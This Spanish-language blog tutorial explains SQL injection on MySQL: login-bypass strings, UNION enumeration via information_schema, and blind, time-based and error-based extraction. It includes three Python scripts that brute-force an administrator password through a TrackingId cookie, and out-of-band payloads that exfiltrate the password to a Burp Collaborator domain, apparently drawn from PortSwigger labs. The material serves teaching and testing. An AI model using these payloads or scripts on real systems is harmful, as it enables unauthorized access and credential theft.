---
title: üíâ SQLi
categories: [Vulnerabilidades]
tags: [sqli]
image: "/assets/img/sqli.png"
description: "SQLI attack"
---

# üíâ **SQL Injection (SQLi)**

Explicaci√≥n acerca de las inyecciones SQL

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/img/sqli.png" width="300"/>
  <p style="font-style: italic; margin-top: 8px;">Copyright ¬© 2010-2025 Freepik Company S.L.</p>
</div>

# **Introducci√≥n**

Antes de comenzar, es importante se√±alar que todas las demostraciones y pruebas se realizar√°n utilizando una base de datos MySQL. Aunque el procedimiento es similar en otros sistemas de gesti√≥n de bases de datos, bastar√° con identificar y aplicar las consultas equivalentes correspondientes para adaptarlo a cada entorno espec√≠fico.

Un sistema de bases de datos t√≠pico, empleado por cualquier servicio que requiera almacenamiento, acceso o interacci√≥n con datos, est√° compuesto por los siguientes elementos:
```text
+-------------+     +-------------+     +-------------+     +-------------+
|             |     |             |     |             |     |             |
|    BBDD     |---->|   Tablas    |---->|  Columnas   |---->|    Datos    |
|             |     |             |     |             |     |             |
+-------------+     +-------------+     +-------------+     +-------------+
```
El prop√≥sito de esta secci√≥n es proporcionar una explicaci√≥n detallada sobre los diferentes tipos de inyecci√≥n SQL, c√≥mo identificarlos adecuadamente y qu√© t√©cnicas pueden emplearse para su explotaci√≥n.

Los principales tipos de inyecci√≥n SQL incluyen: [inyecci√≥n directa](#inyecci√≥n-directa), [inyecci√≥n a ciegas](#inyecci√≥n-a-ciegas), [inyecci√≥n basada en errores](#inyecci√≥n-basada-en-errores) e [inyecci√≥n fuera de banda (out-of-band)](#inyecci√≥n-fuera-de-banda-out-of-band).

Antes de profundizar en cada una de estas variantes, se abordar√°n los elementos que permiten llevar a cabo una inyecci√≥n SQL, as√≠ como la informaci√≥n general que resulta esencial identificar antes de proceder con la obtenci√≥n de datos.

# **Empezamos**

Con el fin de facilitar la comprensi√≥n de los conceptos explicados a lo largo de este blog, se asumir√° como escenario base un formulario t√≠pico de inicio de sesi√≥n que solicita un nombre de usuario y una contrase√±a.

Asimismo, para visualizar de manera m√°s clara las consultas SQL involucradas, se crear√° localmente una tabla denominada **`users`**, que contendr√° dos columnas: **`username`** y **`password`**. Esto permitir√° simular de forma m√°s realista el funcionamiento de un formulario de autenticaci√≥n.
```bash
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | admin    | password |
|  2 | pepe     | pepe     |
+----+----------+----------+
```

Un tipo de consultas as√≠ suele tener una estructura por detr√°s algo parecida a esto:
```bash
SELECT username, password FROM USERS WHERE username = "" AND password = "";
```

En la consulta SQL, los valores entre comillas son sustituidos por los datos introducidos por el usuario a trav√©s del formulario.

La mayor√≠a de las t√©cnicas de inyecci√≥n SQL se apoyan en un patr√≥n com√∫n: **`'-- -`**. Este patr√≥n permite manipular la estructura de la consulta y omitir partes de su l√≥gica original, especialmente las que siguen despu√©s del comentario.

Por ejemplo, si en el campo correspondiente al nombre de usuario se introduce el valor **`'-- -`** en lugar de un nombre de usuario v√°lido, el comportamiento de la consulta se ver√° alterado de la siguiente manera:
```bash
SELECT username, password FROM USERS WHERE username = ‚Äú‚Äù-- -" AND password = "";
```

Como puede observarse, al introducir una comilla simple (**`'`**), se cierra anticipadamente la cadena que se esperaba como entrada v√°lida. A continuaci√≥n, el uso del patr√≥n **`-- -`** indica el inicio de un comentario en SQL, lo que provoca que el resto de la consulta ‚Äîhabitualmente la parte que incluye la cl√°usula **`AND`** o la verificaci√≥n de la contrase√±a‚Äî sea ignorado por el int√©rprete del motor de base de datos.

De este modo, la consulta resultante se ver√≠a modificada de la siguiente forma:
```bash
SELECT username, password FROM USERS WHERE username = ‚Äú‚Äù
```
Del mismo modo, si en lugar de introducir simplemente **`'-- -`** se ingresa el valor **`admin' OR 1=1-- -`**, la consulta SQL se ve a√∫n m√°s comprometida, ya que se introduce una condici√≥n l√≥gica siempre verdadera (**`1=1`**). Esto anula completamente el prop√≥sito del control de autenticaci√≥n.

En este caso, la consulta resultante ser√≠a la siguiente:
```bash
SELECT username, password FROM USERS WHERE username = ‚Äúadmin‚Äù OR 1=1
```

En caso de que exista un usuario llamado **`admin`** en la base de datos, la consulta ser√≠a v√°lida, ya que tanto la condici√≥n **`username = 'admin'`** como **`1=1`** se eval√∫an como verdaderas. Por lo tanto, el sistema devolver√≠a el registro correspondiente al usuario **`admin`**, permitiendo as√≠ el acceso no autorizado.

No obstante, es importante se√±alar que no siempre ser√° tan sencillo. Lo fundamental hasta este punto es comprender que el patr√≥n **`'-- -`** nos permite manipular e interactuar directamente con la consulta SQL que se est√° ejecutando en segundo plano.

Una vez entendido el funcionamiento de esta t√©cnica, el siguiente paso consiste en explorar c√≥mo puede utilizarse para obtener informaci√≥n general sobre el sistema de gesti√≥n de bases de datos que se est√° empleando.

# **Obtenci√≥n de informaci√≥n general**

Para poder extraer informaci√≥n y datos relevantes, primero es necesario obtener cierto conocimiento sobre la estructura del sistema que se encuentra detr√°s. Para ello, resulta √∫til llevar a cabo un proceso de enumeraci√≥n que incluya los siguientes elementos:

- [Las bases de datos existentes](#enumeraci√≥n-de-las-bases-de-datos-existentes).
- [Las tablas contenidas en cada base de datos](#enumeraci√≥n-de-tablas-existentes).
- [Las columnas presentes en dichas tablas](#enumeraci√≥n-de-columnas-existentes).

Este proceso progresivo permite entender c√≥mo est√° organizado el sistema de gesti√≥n de bases de datos (SGBD) y facilita la identificaci√≥n de posibles puntos de extracci√≥n de informaci√≥n.

A continuaci√≥n, retomaremos el an√°lisis de la consulta con la que vamos a trabajar:
```bash
SELECT username, password FROM USERS WHERE username = "" AND password = "";
```
Se est√°n seleccionando dos columnas en funci√≥n de dos par√°metros de entrada. Estas columnas ser√°n las que nos permitir√°n obtener la informaci√≥n deseada.

Aunque a√∫n no hemos profundizado en los distintos tipos de inyecci√≥n SQL, por simplicidad supondremos que nos encontramos ante una inyecci√≥n basada en errores y filtrado de informaci√≥n. Esto implica que, si la consulta es incorrecta, generar√° un fallo, y si es v√°lida, mostrar√° la informaci√≥n solicitada.

No obstante, una vez comprendidos todos los conceptos de esta secci√≥n, ser√° posible adaptar estas consultas a cada tipo espec√≠fico de inyecci√≥n.

Por ejemplo, si introducimos el valor **`admin' order by 3 -- -`** en el campo de nombre de usuario, la consulta resultante quedar√≠a de la siguiente manera:
```bash
SELECT username, password FROM users WHERE username = ‚Äúadmin‚Äù order by 3
```
Si ejecutamos esta consulta, obtenemos esto:
```bash
ERROR 1054 (42S22): Unknown column '3' in 'ORDER BY'
```

Esto se debe a que estamos indicando que la consulta ordene los resultados seg√∫n la tercera columna de la tabla. Sin embargo, como se puede observar, solo existen dos columnas: **`username`** y **`password`**.

La clave de esta t√©cnica consiste en realizar pruebas incrementales hasta identificar el n√∫mero exacto de columnas que la tabla tiene.  

Por ejemplo, si en lugar de **`3`** indicamos **`2`**, la consulta se ejecutar√≠a correctamente y no generar√≠a error, lo que confirmar√≠a que la tabla solo contiene dos columnas.
```bash
SELECT username, password FROM USERS WHERE username = ‚Äòadmin‚Äô order by 2
```

Obtenemos la siguiente respuesta:
```text
+----------+----------+
| username | password |
+----------+----------+
| admin    | password |
+----------+----------+
```

Como se puede apreciar, la consulta devuelve el nombre de usuario y su contrase√±a, dado que al existir dos columnas en la tabla, el uso de `ORDER BY 2` no genera error.

Una vez confirmado esto, podemos proceder a enumerar las bases de datos, tablas y columnas presentes en el sistema.

## **Enumeraci√≥n de las bases de datos existentes**

Para enumerar las bases de datos, podemos utilizar la siguiente estructura:
```bash
SELECT username, password FROM users WHERE username = "admin" union select NULL,schema_name from information_schema.schemata;
```

Y obtenemos lo siguiente:
```text
+----------+--------------------+
| username | password           |
+----------+--------------------+
| admin    | password           |
| NULL     | information_schema |
| NULL     | sys                |
| NULL     | example            |
| NULL     | performance_schema |
| NULL     | mysql              |
+----------+--------------------+
```

Por comodidad, podemos utilizar la funci√≥n **`GROUP_CONCAT`** para concatenar toda la informaci√≥n en una sola l√≠nea, facilitando as√≠ su visualizaci√≥n y an√°lisis.
```bash
SELECT username, password FROM users WHERE username = "admin" union select NULL,group_concat(schema_name) from information_schema.schemata;
```

```text
+----------+---------------------------------------------------------+
| username | password                                                |
+----------+---------------------------------------------------------+
| admin    | password                                                |
| NULL     | information_schema,sys,example,performance_schema,mysql |
+----------+---------------------------------------------------------+
```

## **Enumeraci√≥n de tablas existentes**

Para las tablas de una de las bases de datos enumeradas arriba, utilizamos:
```bash
SELECT username, password FROM users WHERE username = "admin" union select NULL,group_concat(table_name) from information_schema.tables where table_schema = "example";
```

Obtenemos:
```text
+----------+----------+
| username | password |
+----------+----------+
| admin    | password |
| NULL     | users    |
+----------+----------+
```

## **Enumeraci√≥n de columnas existentes**

Para las columnas de una tabla espec√≠fica, por ejemplo, la tabla **`users`** dentro de la base de datos **`example`**, utilizamos:
```bash
SELECT username, password FROM users WHERE username = "admin" union select NULL,group_concat(column_name) from information_schema.columns where
 table_schema = "example" and table_name = "users";
```

Resultado:
```text
+----------+----------------------+
| username | password             |
+----------+----------------------+
| admin    | password             |
| NULL     | id,username,password |
+----------+----------------------+
```

Con todos estos pasos, somos capaces de enumerar las bases de datos existentes, seleccionar una base de datos espec√≠fica, listar sus tablas, elegir una tabla y obtener sus columnas.

Aunque de manera indirecta ya se haya mencionado la forma m√°s sencilla de inyectar consultas maliciosas, procederemos a explicar nuevamente, de forma breve, el concepto de las inyecciones directas.

# **Inyecci√≥n directa**

La inyecci√≥n directa consiste en introducir el patr√≥n **`'-- -`** en un campo de inicio de sesi√≥n para obtener acceso inmediato sin necesidad de autenticaci√≥n v√°lida. 

Por ejemplo, si asumimos que existe un usuario administrador, al ingresar **`admin'-- -`** en el campo correspondiente y siempre que el usuario **`admin`** est√© registrado, se lograr√° acceder al sistema con los privilegios de dicho usuario.

# **Inyecci√≥n a ciegas**

La inyecci√≥n a ciegas se presenta cuando, al ejecutar la inyecci√≥n, no se recibe ning√∫n error ni se obtiene informaci√≥n directa de la base de datos. Sin embargo, se pueden detectar variaciones en el contenido mostrado o en el tiempo de respuesta del sistema.

Dentro de este tipo de inyecciones, se distinguen dos variantes principales:

- [Inyecci√≥n basada en condicionales](#inyecci√≥n-basada-en-condicionales).
- [Inyecci√≥n basada en tiempo](#inyecci√≥n-basada-en-tiempo).

## **Inyecci√≥n basada en condicionales**

La inyecci√≥n basada en condicionales ocurre cuando, al realizar la inyecci√≥n, no se produce ning√∫n error visible, pero se detecta alg√∫n cambio sutil en la respuesta del servidor.  

Por ejemplo, una p√°gina web puede mostrar un mensaje como "bienvenido de vuelta" o alguna otra indicaci√≥n que permita inferir que la inyecci√≥n se ha ejecutado correctamente.

Con esta informaci√≥n, es posible aplicar las t√©cnicas mencionadas anteriormente para enumerar informaci√≥n relevante. A continuaci√≥n, se presenta un ejemplo para verificar la existencia hipot√©tica del usuario administrador.
```bash
SELECT username, password FROM users WHERE username = "admin" and (select 'a' from users limit 1) = 'a';
```

Si la ejecutamos el servidor nos devuelve lo siguiente:
```text
+----------+----------+
| username | password |
+----------+----------+
| admin    | password |
+----------+----------+
```

Esta consulta verifica si la primera fila de la columna **`users`** contiene la letra **`'a'`**. Si la condici√≥n se cumple, el resultado ser√° verdadero; de lo contrario, ser√° falso.

En principio, esto puede no parecer muy √∫til, pero si se automatiza un script en Python que pruebe letra por letra y compruebe si la condici√≥n se cumple, es posible enumerar usuarios.

Sin embargo, es importante destacar que esta consulta no garantiza que la letra **`'a'`** sea la primera letra del valor, sino √∫nicamente que dicha letra se encuentra en la primera fila de la columna **`users`**.

Por esta raz√≥n, podemos emplear una sintaxis alternativa que resulta m√°s precisa y √∫til:
```bash
... AND (SELECT SUBSTRING(username, 1, 1) FROM users WHERE username = ‚Äúadmin‚Äù) = 'a'
```

Pero tambi√©n la podemos usar para obtener la contrase√±a:
```bash
SELECT username, password FROM users WHERE username = "admin" and (select substring(password,1,1) from users where username = "admin") ='p';
```

```text
+----------+----------+
| username | password |
+----------+----------+
| admin    | password |
+----------+----------+
```

En este caso, la consulta selecciona el valor contenido en la columna **`password`** correspondiente al usuario cuyo **`username`** es **`admin`**.  

Posteriormente, se verifica si el primer car√°cter de este valor es la letra **`'p'`**. Seg√∫n si esta condici√≥n se cumple o no, la respuesta del servidor ser√° diferente.

A partir de esta variaci√≥n en la respuesta, es posible emplear un script en Python para automatizar este proceso, lo que permitir√≠a eventualmente deducir la contrase√±a del usuario administrador.

## **Inyecci√≥n basada en tiempo**

Las inyecciones SQL basadas en tiempo constituyen una variante de las inyecciones a ciegas, ya que no generan mensajes de error ni revelan informaci√≥n directa de la base de datos.

Aunque las inyecciones basadas en condicionales suelen ser efectivas, en algunos casos no es posible detectar cambios en la respuesta del servidor que indiquen si la inyecci√≥n fue procesada correctamente.

En estos escenarios, se utiliza el tiempo de respuesta como indicador, ya que este comportamiento puede ser observado desde el lado del cliente.
```bash
and if(substr(database(),1,1) = ‚Äòe‚Äô, sleep(5), 1)
```

Y si lo insertamos en la petici√≥n, observamos lo siguiente:
```bash
select username,password from users where username = "admin" and if(substring(database(),1,1) = 'e',sleep(5),1);
Empty set (5,001 sec)
```

Como podemos observar, la petici√≥n no genera error y, adem√°s, tarda aproximadamente 5 segundos en responder, lo que indica que la inyecci√≥n ha sido exitosa.

De manera similar a las inyecciones basadas en condiciones, el uso de scripts en Python para automatizar el proceso resulta igualmente eficaz en este caso.

A continuaci√≥n, os dejo dos ejemplos b√°sicos de scripts en Python: uno para inyecciones basadas en condiciones y otro para inyecciones basadas en tiempo.

**Condicionales**

```python
#!/usr/bin/python3

from pwn import *
import requests, signal, time, pdb, sys, string

def def_handler(sig, frame):
    print("\n\n[!] Saliendo\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

main_url = ""
trakingId = ""
session = ""

characters = string.ascii_lowercase + string.digits

def makeRequest():

    password = ""	

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque")

    time.sleep(2)

    p2 = log.progress("Password")

    for position in range(1, 21):
        for character in characters:
            cookies = {
                'TrackingId': "%s' and (select substring(password,%d,1) from users where username = 'administrator')='%s" % (trakingId, position, character),
                'session' : session
            }

            p1.status(cookies['TrackingId'])

            r = requests.get(main_url, cookies=cookies)

            if "Welcome back!" in r.text: # This is the text that changes
                password += character
                p2.status(password)
                break
if __name__ == '__main__':
    makeRequest()
```

**Tiempo**

```python
#!/usr/bin/python3

from pwn import *
import requests, signal, time, pdb, sys, string

def def_handler(sig, frame):
    print("\n\n[!] Saliendo\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

main_url = ""
trackingId = ""
session = ""

characters = string.ascii_lowercase + string.digits

def makeRequest():

    password = ""

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque")

    time.sleep(2)

    p2 = log.progress("Password")

    for position in range(1, 21):
        for character in characters:
            cookies = {
                'TrackingId': "TrackingId=%s'||(select case when substr(password,%d,1)='%s' then pg_sleep(2) else '' end from users where username = 'administrator')||'" % (trackingId, position, character),
                'session' : session
            }

            p1.status(cookies['TrackingId'])

            init_time = time.time()

            r = requests.get(main_url, cookies=cookies)

            final_time = time.time()

            if final_time - init_time > 1.5:
                password += character
                p2.status(password)
                break
if __name__ == '__main__':
    makeRequest()
```

# **Inyecci√≥n basada en errores**

En el caso de que estemos ante una inyecci√≥n SQL basada en errores, la forma de afrontarla es muy parecida a las inyecciones basadas en condicionales o en tiempo. Pero, en este caso en vez de evaluar algo cambiante en la respuesta o el tiempo de la respuesta, evaluamos el c√≥digo de estado que nos devuelve el servidor una vez realizada la petici√≥n. 

A continuaci√≥n os dejo un script en Python para que se entienda mejor:
```python
#!/usr/bin/python3

from pwn import *
import requests, signal, time, pdb, sys, string

def def_handler(sig, frame):
    print("\n\n[!] Saliendo\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

main_url = ""
trackingId = ""
session = ""

characters = string.ascii_lowercase + string.digits

def makeRequest():

    password = ""

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque")

    time.sleep(2)

    p2 = log.progress("Password")

    for position in range(1, 21):
        for character in characters:
            cookies = {
                'TrackingId': "TrackingId=%s'||(select case when substr(password,%d,1)='%s' then to_char(1/0) else '' end from users where username = 'administrator')||'" % (trackingId, position, character),
                'session' : session
            }

            p1.status(cookies['TrackingId'])

            r = requests.get(main_url, cookies=cookies)

            if r.status_code == 500:
                password += character
                p2.status(password)
                break
if __name__ == '__main__':
    makeRequest()
```

El funcionamiento del script se basa en provocar intencionadamente un error en el servidor cuando se cumple una condici√≥n espec√≠fica relacionada con un car√°cter de la contrase√±a. Este error genera un c√≥digo de estado HTTP 500, que el script detecta para confirmar que el car√°cter probado es correcto. As√≠, al forzar el error mediante una operaci√≥n matem√°tica inv√°lida dentro de la consulta SQL, el script va descubriendo car√°cter por car√°cter la contrase√±a completa.

# **Inyecci√≥n fuera de banda (out-of-band)**

La inyecci√≥n fuera de banda (Out-of-Band, OOB) se presenta en los casos en los que, mediante ninguno de los m√©todos anteriores, es posible obtener informaci√≥n directamente en la respuesta del servidor. Su funcionamiento consiste en lograr que la v√≠ctima, a trav√©s de un campo vulnerable, realice un **`DNS Lookup`** hacia un dominio controlado por el atacante, lo que permite exfiltrar informaci√≥n de manera indirecta.

Para esta demostraci√≥n utilizaremos Burp Suite Professional, lo que nos permite aprovechar los laboratorios de PortSwigger gracias a la funcionalidad de Collaborator.

En este laboratorio, el campo vulnerable es el mismo que en las inyecciones a ciegas: un par√°metro **`TrackingId`** en el que no se valida correctamente el input del usuario. El primer paso para explotar este vector de ataque es comprobar si podemos recibir una conexi√≥n desde la m√°quina v√≠ctima. Esto se consigue con el siguiente payload:
```bash
UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://7hptktc91uvd60mugoyqih8rkiq9e32s.oastify.com/"> %remote;]>'),'/l') FROM dual
```

Si a continuaci√≥n nos dirigimos a la secci√≥n Collaborator en Burp Suite y revisamos las solicitudes recibidas, podemos observar lo siguiente:

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/sqli/sqli-1.png" width="1000"/>
</div>

Con esta informaci√≥n confirmamos que el campo es vulnerable y que la v√≠ctima puede enviarnos datos. Por ello, empleamos el siguiente payload para extraer informaci√≥n:
```bash
UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(select password from users where username='administrator')||'.bkzxnxfd4yyh94pyjs1ullbvnmtdh95y.oastify.com/"> %remote;]>'),'/l') FROM dual
```

Si a continuaci√≥n volvemos a revisar el Collaborator, podemos observar lo siguiente:

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/sqli/sqli-2.png" width="1000"/>
</div>

Como se puede observar, hemos recibido una petici√≥n hacia un supuesto subdominio bajo nuestro control, donde la primera parte **`r8guco2cc08lrtn10us5`** corresponde realmente a la contrase√±a del usuario administrador.  

Es importante destacar que, para realizar este tipo de inyecci√≥n, es necesario suponer tanto el nombre de la tabla como el de las columnas, lo que a√±ade un grado adicional de complejidad al ataque.